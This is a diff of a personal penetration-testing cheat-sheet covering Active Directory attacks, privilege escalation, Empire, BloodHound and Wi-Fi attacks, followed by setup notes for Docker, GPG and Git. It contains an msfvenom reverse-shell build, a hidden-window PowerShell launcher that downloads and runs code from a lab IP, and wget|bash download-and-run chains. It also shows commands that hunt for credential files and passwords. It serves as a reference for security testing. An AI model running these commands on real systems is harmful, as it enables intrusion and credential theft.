@@ -1010,6 +1010,8 @@ $ ./rbcd.py -t 'CN=dc01,OU=Domain Controllers,DC=megacorp,DC=local' -d megacorp.
 
 ##### Bronze Bit
 
+**CVE-2020-17049**
+
 * [blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/)
 * [blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/)
 * [gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372)
@@ -1335,7 +1337,7 @@ $ ticketer.py -nthash 00ff00ff00ff00ff00ff00ff00ff00ff -user-id 31337 -groups 51
 For DCSyncing we'll need only parent domain FQDN (megacorp.local):
 
 ```
-([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest())[0].RootDomain.Name
+PS > ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest())[0].RootDomain.Name
 megacorp.local
 ```
 
@@ -1868,15 +1870,15 @@ $ secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds
 Master keys locations (hidden files, need `-Force`):
 
 ```
-PS > ls -fo C:\Users\snovvcrash\AppData\Roaming\Microsoft\Protect\
-PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Protect\
+PS > ls -fo C:\Users\snovvcrash\AppData\Roaming\Microsoft\Protect\ (%appdata%\Microsoft\Protect\)
+PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Protect\ (%localappdata%\Microsoft\Protect\)
 ```
 
 Credential files locations (hidden files, need `-Force`):
 
 ```
-PS > ls -fo C:\Users\snovvcrash\AppData\Roaming\Microsoft\Credentials\
-PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\
+PS > ls -fo C:\Users\snovvcrash\AppData\Roaming\Microsoft\Credentials\ (%appdata%\Microsoft\Credentials\)
+PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\ (%localappdata%\Microsoft\Credentials\)
 ```
 
 
@@ -2138,9 +2140,9 @@ PS > cmd /c C:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe payload.xm
 
 ```
 $ git clone https://github.com/Genetic-Malware/Ebowla ~/tools/Ebowla && cd ~/tools/Ebowla
-$ sudo apt install golang mingw-w64 wine -y
+$ sudo apt install golang mingw-w64 wine python-dev -y
 $ sudo python -m pip install configobj pyparsing pycrypto pyinstaller
-$ sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.167 LPORT=1337 --platform win -f exe -a x64 -o rev.exe
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.13.37 LPORT=1337 --platform win -f exe -a x64 -o rev.exe
 $ vi genetic.config
 ...Edit output_type, payload_type, clean_output, [[ENV_VAR]]...
 $ python ebowla.py rev.exe genetic.config && rm rev.exe
@@ -2165,7 +2167,6 @@ $ ./build_x64_go.sh output/go_symmetric_rev.exe.go ebowla-rev.exe [--hidden] && 
 * [powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/](https://powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/)
 
 ```
-$ curl -L https://github.com/PowerShellMafia/PowerSploit/raw/master/ScriptModification/Out-EncryptedScript.ps1 > outenc.ps1
 PS > Out-EncryptedScript .\script.ps1 $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) s4lt -FilePath .\evil.ps1
 PS > [string] $cmd = gc .\evil
 PS > $dec = de "Passw0rd!" s4lt
@@ -2656,40 +2657,6 @@ find / -type f -perm /6000 -ls 2>/dev/null
 ```
 
 
-#### Tools
-
-`LinEnum.sh`:
-
-```
-root@kali:$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && python3 -m http.server 80
-user@vict:$ wget 127.0.0.1/LinEnum.sh -qO- |bash
-```
-
-`lse.sh`:
-
-```
-root@kali:$ wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh && python3 -m http.server 80
-user@vict:$ wget 127.0.0.1/lse.sh -qO- |bash
-```
-
-`linPEAS.sh` (linPEAS):
-
-```
-root@kali:$ wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh && python3 -m http.server 80
-user@vict:$ wget 127.0.0.1/linpeas.sh -qO- |sh
-```
-
-`pspy`:
-
-```
-root@kali:$ wget [1] && python3 -m http.server 80
-user@vict:$ wget 127.0.0.1/pspy -qO /dev/shm/pspy && cd /dev/shm && chmod +x pspy
-user@vict:$ ./pspy
-```
-
-1. [github.com/DominicBreuker/pspy/releases](https://github.com/DominicBreuker/pspy/releases)
-
-
 
 ### Rootkits
 
@@ -2749,87 +2716,11 @@ PAM MOTD:
 ## Windows
 
 
-### Recon
-
-PowerShell history:
-
-```
-PS > Get-Content C:\Users\snovvcrash\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-```
-
-
-#### Tools
-
-winPEAS:
-
-```
-$ git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite ~/tools/privilege-escalation-awesome-scripts-suite
-$ cp ~/tools/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe . && python3 -m http.server 80
-PS > (new-object net.webclient).downloadfile('http://127.0.0.1/winPEAS.exe', 'C:\Users\snovvcrash\music\winPEAS.exe')
-```
-
-PowerUp.ps1:
-
-* [github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
-* [github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)
-* [recipeforroot.com/advanced-powerup-ps1-usage/](https://recipeforroot.com/advanced-powerup-ps1-usage/)
-
-```
-$ curl -L https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/PowerUp.ps1 > powerup.ps1
-PS > Invoke-PrivescAudit
-```
-
-PowerUpSQL.ps1:
-
-* [github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
-
-```
-$ curl -L https://github.com/NetSPI/PowerUpSQL/raw/master/PowerUpSQL.ps1 > powerupsql.ps1
-PS > Get-SQLInstanceDomain
-PS > Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Threads 10 -UserName sa -Password 'Passw0rd!' -Verbose
-PS > Invoke-SQLOSCmd -UserName sa -Password 'Passw0rd!' -Instance sqlsrv01.megacorp.local -Command whoami
-```
-
-Sherlock.ps1:
-
-```
-$ wget https://github.com/rasta-mouse/Sherlock/raw/master/Sherlock.ps1 && python3 -m http.server 80
-PS > powershell.exe -exec bypass -c "& {Import-Module .\Sherlock.ps1; Find-AllVulns |Out-File sherlock.txt}"
-```
-
-Watson:
-
-* [github.com/rasta-mouse/Watson](https://github.com/rasta-mouse/Watson)
-
-JAWS:
-
-```
-$ wget https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1 && python3 -m http.server 80
-PS > powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstring('http://127.0.0.1/jaws-enum.ps1')"
-PS > .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
-```
-
-PrivescCheck:
-
-* [github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)
-
-```
-PS > powershell.exe -exec bypass -c ". .\privesccheck.ps1; Invoke-PrivescCheck -Extended | Tee-Object privesccheck-out.txt"
-```
-
-Windows-Exploit-Suggester:
-
-* [github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
-
-```
-$ python -u windows-exploit-suggester.py -d 2020-09-02-mssb.xls -i systeminfo.txt --ostext 'windows 10 64-bit' --hotfixes hotfixes.txt | tee wes.log
-```
-
-
 
 ### Registry & Filesystem
 
 ```
+PS > Get-Content C:\Users\snovvcrash\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 PS > cmd /c dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 PS > cmd /c where /R C:\ *.ini
 PS > reg query HKLM /f "password" /t REG_SZ /s
@@ -3719,7 +3610,6 @@ $ sort -u -t: -k1,1 ~/workspace/loot/net-ntlmv2.responder >> ~/workspace/loot/ne
 * [github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
 
 ```
-$ curl -L https://github.com/Kevin-Robertson/Inveigh/raw/master/Inveigh.ps1 > inveigh.ps1
 PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
 ```
 
@@ -3729,7 +3619,6 @@ PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y -NBNS Y �
 * [github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)
 
 ```
-$ curl -L https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/Inveigh.exe > inveigh.exe
 PS > .\inveigh.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y
 ```
 
@@ -3939,7 +3828,6 @@ $ grep 'open' hosts/rmisweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -
 * [powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/)
 
 ```
-$ curl -L https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/Invoke-Portscan.ps1 > portscan.ps1
 PS > Invoke-Portscan -Hosts 127.0.0.1/24 -T 4 -TopPorts 25 -oA localnet
 ```
 
@@ -4204,7 +4092,6 @@ Discover MS Exchnage servers' FQDN names:
 * [github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSExchangeServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSExchangeServers)
 
 ```
-$ curl -L https://github.com/PyroTek3/PowerShell-AD-Recon/raw/master/Discover-PSMSExchangeServers > discover-exch.ps1
 PS > Discover-PSMSExchangeServers | Select ServerName,Description | Tee-Object exch.txt
 ```
 
@@ -4213,7 +4100,6 @@ Discover MS SQL servers' FQDN names:
 * [github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers)
 
 ```
-$ curl -L https://github.com/PyroTek3/PowerShell-AD-Recon/raw/master/Discover-PSMSSQLServers > discover-mssql.ps1
 PS > Discover-PSMSSQLServers | Select ServerName,Description | Tee-Object mssql.txt
 ```
 
@@ -4422,7 +4308,7 @@ $ enum4linux -v -a 127.0.0.1 | tee enum4linux.txt
 
 
 
-### nullinux.py
+### nullinux
 
 * [github.com/m8r0wn/nullinux](https://github.com/m8r0wn/nullinux)
 
@@ -4440,6 +4326,7 @@ $ nullinux.py 127.0.0.1
 ```
 $ ./kerbrute -v --delay 100 -d megacorp.local -o kerbrute-passwordspray-123456.log passwordspray users.txt '123456'
 ```
+
 
 
 ### DomainPasswordSpray
@@ -4530,6 +4417,28 @@ $ cme smb 127.0.0.1 -u snovvcrash -p '' -M lsassy
 
 
 
+### Empire
+
+* [github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)
+
+Install:
+
+```
+$ git clone https://github.com/BC-SECURITY/Empire ~/tools/Empire && cd ~/tools/Empire
+$ sudo STAGING_KEY=`echo 'H4ckTh3Pl4net!' | md5sum | cut -d' ' -f1` ./setup/install.sh
+$ sudo poetry install
+$ echo $'#!/usr/bin/env bash\n\nsudo poetry run python empire' > ~/tools/Empire/run_empire.sh
+$ chmod +x ~/tools/Empire/run_empire.sh
+```
+
+Pwsh launcher string:
+
+```
+PS > powershell -NoP -sta -NonI -W Hidden -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/launcher.ps1')"
+```
+
+
+
 ### Bloodhound
 
 
@@ -4553,18 +4462,16 @@ $ ./BloodHound
 
 #### Collectors
 
-`SharpHound.ps1`:
+##### SharpHound.ps1
 
 ```
-$ curl -L https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 > sharphound.ps1
 PS > Invoke-Bloodhound -CollectionMethod All,GPOLocalGroup -Domain megacorp.local -LDAPUser snovvcrash -LDAPPass 'Passw0rd!'
 PS > Invoke-Bloodhound -CollectionMethod SessionLoop -Domain megacorp.local
 ```
 
-`SharpHound.exe`:
+##### SharpHound.exe
 
 ```
-$ curl -L https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe > sharphound.exe
 PS > .\SharpHound.exe -c All,GPOLocalGroup -d megacorp.local --ldapusername snovvcrash --ldappassword 'Passw0rd!'
 PS > .\SharpHound.exe -c SessionLoop -d megacorp.local
 ```
@@ -4593,49 +4500,6 @@ RETURN totalUsers, usersWithSessions, 100 * usersWithSessions / totalUsers AS pe
 ```
 $ cd ~/workspace/enum/bloodhound/bloodhound.py/
 $ bloodhound-python -c All,LoggedOn -u snovvcrash -p 'Passw0rd!' -d megacorp.local -ns 127.0.0.1
-```
-
-
-
-### Empire
-
-* [github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)
-
-Install:
-
-```
-$ git clone https://github.com/BC-SECURITY/Empire ~/tools/Empire && cd ~/tools/Empire
-$ sudo STAGING_KEY=`echo 'H4ckTh3Pl4net!' | md5sum | cut -d' ' -f1` ./setup/install.sh
-$ sudo poetry install
-$ echo $'#!/usr/bin/env bash\n\nsudo poetry run python empire' > ~/tools/Empire/run_empire.sh
-$ chmod +x ~/tools/Empire/run_empire.sh
-```
-
-Pwsh launcher string:
-
-```
-PS > powershell -NoP -sta -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/launcher.ps1')"
-```
-
-
-
-### PowerView
-
-* [www.harmj0y.net/blog/powershell/make-powerview-great-again/](https://www.harmj0y.net/blog/powershell/make-powerview-great-again/)
-* [github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
-* [gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
-* [PowerView2.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)
-* [PowerView3.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
-* [PowerView3.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1#L5907-L6122) [\[New-GPOImmediateTask\]](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
-* [PowerView4.ps1](https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1) [\[fork\]](https://exploit.ph/powerview.html)
-
-```
-$ curl -L https://github.com/PowerShellEmpire/PowerTools/raw/master/PowerView/powerview.ps1 > powerview2.ps1
-$ curl -L https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1 > powerview3.ps1
-$ curl -L https://github.com/PowerShellMafia/PowerSploit/raw/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1 > powerview3-gpo.ps1
-$ curl -L https://github.com/ZeroDayLab/PowerSploit/raw/master/Recon/PowerView.ps1 > powerview4.ps1
-PowerView3 > Get-DomainComputer -Properties Name | Resolve-IPAddress
-PowerView3 > Invoke-Kerberoast -OutputFormat Hashcat | fl
 ```
 
 
@@ -4671,7 +4535,79 @@ $ ./scan.py -target-file DCs.txt MEGACORP/snovvcrash:'Passw0rd!'
 
 
 
-### One-liners
+### PowerView
+
+* [www.harmj0y.net/blog/powershell/make-powerview-great-again/](https://www.harmj0y.net/blog/powershell/make-powerview-great-again/)
+* [github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
+* [gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+* [PowerView2.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)
+* [PowerView3.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+* [PowerView3.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1#L5907-L6122) [(New-GPOImmediateTask)](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
+* [PowerView4.ps1](https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1) [(ZeroDayLab)](https://exploit.ph/powerview.html)
+
+```
+PowerView3 > Get-DomainComputer -Properties Name | Resolve-IPAddress
+PowerView3 > Invoke-Kerberoast -OutputFormat Hashcat | fl
+```
+
+
+
+### PowerUp.ps1
+
+* [github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+* [github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)
+* [recipeforroot.com/advanced-powerup-ps1-usage/](https://recipeforroot.com/advanced-powerup-ps1-usage/)
+
+```
+PS > Invoke-PrivescAudit
+```
+
+
+
+### PowerUpSQL.ps1
+
+* [github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
+
+```
+PS > Get-SQLInstanceDomain
+PS > Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Threads 10 -UserName sa -Password 'Passw0rd!' -Verbose
+PS > Invoke-SQLOSCmd -UserName sa -Password 'Passw0rd!' -Instance sqlsrv01.megacorp.local -Command whoami
+```
+
+
+
+### Windows-Exploit-Suggester
+
+* [github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+
+```
+$ python -u windows-exploit-suggester.py -d 2020-09-02-mssb.xls -i systeminfo.txt --ostext 'windows 10 64-bit' --hotfixes hotfixes.txt | tee wes.log
+```
+
+
+
+### JAWS
+
+```
+$ wget https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1 && python3 -m http.server 80
+PS > powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstring('http://127.0.0.1/jaws-enum.ps1')"
+PS > .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
+```
+
+
+
+### PrivescCheck
+
+* [github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)
+
+```
+PS > powershell.exe -exec bypass -c ". .\privesccheck.ps1; Invoke-PrivescCheck -Extended | Tee-Object privesccheck-out.txt"
+```
+
+
+
+
+## One-liners
 
 PowerShell ping sweep:
 
@@ -5354,6 +5290,7 @@ $ sudo wifite -vi wlan1 --clients-only --wpa --no-wps
 
 #### PMKID
 
+* https://habr.com/ru/company/jetinfosystems/blog/419383/
 * [habr.com/ru/company/jetinfosystems/blog/419383/](https://habr.com/ru/company/jetinfosystems/blog/419383/)
 
 ##### wifite2
@@ -5552,30 +5489,6 @@ $ sudo ./eaphammer --bssid 1C:7E:E5:97:79:B1 --essid Example --channel 1 --inter
 
 
 
-# Sublime Text
-
-
-
-
-## Installation
-
-
-
-### Linux
-
-```
-$ wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -
-$ sudo apt install apt-transport-https -y
-$ echo "deb https://download.sublimetext.com/ apt/stable/" | sudo tee /etc/apt/sources.list.d/sublime-text.list
-$ sudo apt update && sudo apt install sublime-text -y
-
-$ wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add - && sudo apt install apt-transport-https -y && echo "deb https://download.sublimetext.com/ apt/stable/" | sudo tee /etc/apt/sources.list.d/sublime-text.list && sudo apt update && sudo apt install sublime-text -y
-```
-
-
-
-
-
 # Git
 
 Add SSH key to the ssh-agent:
@@ -5622,13 +5535,14 @@ $ docker build -t <USERNAME>/<IMAGE> .
 
 ```
 $ sudo apt install apt-transport-https ca-certificates curl gnupg-agent software-properties-common -y
-$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
+(Ubuntu) $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
+(Kali) $ curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
 [$ sudo apt-key fingerprint 0EBFCD88]
-$ sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
-(Or for Kali) $ echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' | sudo tee /etc/apt/sources.list.d/docker.list
+(Ubuntu) $ sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
+(Kali) $ echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' | sudo tee /etc/apt/sources.list.d/docker.list
 $ sudo apt update
 [$ apt-cache policy docker-ce]
-$ sudo apt install docker-ce
+$ sudo apt install docker-ce -y
 [$ sudo systemctl status docker]
 $ sudo usermod -aG docker ${USER}
 relogin
@@ -5638,10 +5552,12 @@ relogin
 
 #### docker-compose
 
+* [docs.docker.com/compose/install/#install-compose-on-linux-systems](https://docs.docker.com/compose/install/#install-compose-on-linux-systems)
+
 ```
-$ sudo curl -L "https://github.com/docker/compose/releases/download/1.25.3/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
+$ sudo curl -L "https://github.com/docker/compose/releases/download/1.27.4/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
 $ sudo chmod +x /usr/local/bin/docker-compose
-[$ sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose]
+$ sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose
 ```
 
 
@@ -5825,6 +5741,10 @@ $ python3 -m pip install bpython
 
 # GPG
 
+* [How to Use GPG Keys to Send Encrypted Messages](https://www.linode.com/docs/security/encryption/gpg-keys-to-send-encrypted-messages/)
+* [Используем GPG для шифрования сообщений и файлов / Хабр](https://habr.com/ru/post/358182/)
+* [Как пользоваться gpg: шифрование, расшифровка файлов и сообщений, подпись файлов и проверка подписи, управление ключами - HackWare.ru](https://hackware.ru/?p=8215)
+
 List keychain:
 
 ```
@@ -5878,14 +5798,25 @@ $ gpg --verify signed.txt.sig signed.txt
 ```
 
 Decrypt and verify:
+
 ```
 $ gpg -o/--output decrypted.txt -d/--decrypt --try-secret-key user1@example.com encrypted.txt.gpg
 $ gpg -o/--output decrypted.txt -d/--decrypt -u/--local-user user1@example.com -r/--recipient user2@example.com encrypted.txt.gpg
 ```
 
-* [How to Use GPG Keys to Send Encrypted Messages](https://www.linode.com/docs/security/encryption/gpg-keys-to-send-encrypted-messages/)
-* [Используем GPG для шифрования сообщений и файлов / Хабр](https://habr.com/ru/post/358182/)
-* [Как пользоваться gpg: шифрование, расшифровка файлов и сообщений, подпись файлов и проверка подписи, управление ключами - HackWare.ru](https://hackware.ru/?p=8215)
+
+
+
+## Signing Git Commits
+
+* [www.youtube.com/watch?v=1vVIpIvboSg](https://www.youtube.com/watch?v=1vVIpIvboSg)
+* [www.youtube.com/watch?v=4166ExAnxmo](https://www.youtube.com/watch?v=4166ExAnxmo)
+
+Cache passphrase in gpg agent (dirty):
+
+```
+$ cd /tmp && touch aaa && gpg --sign aaa && rm aaa aaa.gpg && cd -
+```
 
 
 
@@ -5931,7 +5862,7 @@ $ nslookup ya.ru
 $ sudo systemctl enable ssh --now
 ```
 
-Route inner traffic to eth0 (lan), internet to wan wlan0 (wan):
+Route inner traffic to eth0 (lan), internet to wlan0 (wan):
 
 ```
 $ sudo route -n
@@ -6001,9 +5932,9 @@ $ sudo netplan apply
 Mix settings list (both for hardware install and virtualization):
 
 ```
-[VM] Disable screen lock (Power manager settings -> Display -> Display power manager -> OFF)
+[VM] Disable screen lock (Power Manager -> Display, Security -> OFF)
 [VM] Configure networks (+ remember to configure VBox DHCP first)
-[All] Update && Upgrade (+ change /etc/apt/sources.list to HTTPS if getting "403 Forbidden" because of the antivirus)
+[All] Update && Upgrade (+ change /etc/apt/sources.list to HTTPS if getting "403 Forbidden" because of AV)
 	$ sudo apt update && sudo upgrade -y
 	$ sudo reboot
 [VM] Install guest additions
@@ -6020,8 +5951,8 @@ Mix settings list (both for hardware install and virtualization):
 				* Re-login as root
 			CASE (non-root):
 				$ sudo useradd -m -s /bin/bash -u 1337 snovvcrash
-				$ passwd snovvcrash
-				$ usermod -aG sudo snovvcrash
+				$ sudo passwd snovvcrash
+				$ sudo usermod -aG sudo snovvcrash
 				* Re-login as snovvcrash
 		}
 	* Disable kali user [VM]
@@ -6043,7 +5974,7 @@ Mix settings list (both for hardware install and virtualization):
 		}
 [ALL] Install cmake
 	$ sudo apt install cmake -y
-[ALL] Pull dotfiles
+[ALL] Clone dotfiles
 	$ git clone https://github.com/snovvcrash/dotfiles-linux ~/.dotfiles
 [ALL] Run ~/.dotfiles/00-autodeploy scripts on the discretion
 ```
@@ -6645,7 +6576,16 @@ $ sudo fail2ban-client unban --all
 
 
 
-### git
+### Git
+
+Update to latest version:
+
+```
+$ sudo add-apt-repository ppa:git-core/ppa -y
+$ sudo apt update
+$ sudo apt install git -y
+$ git version
+```
 
 Syncing a forked repository:
 
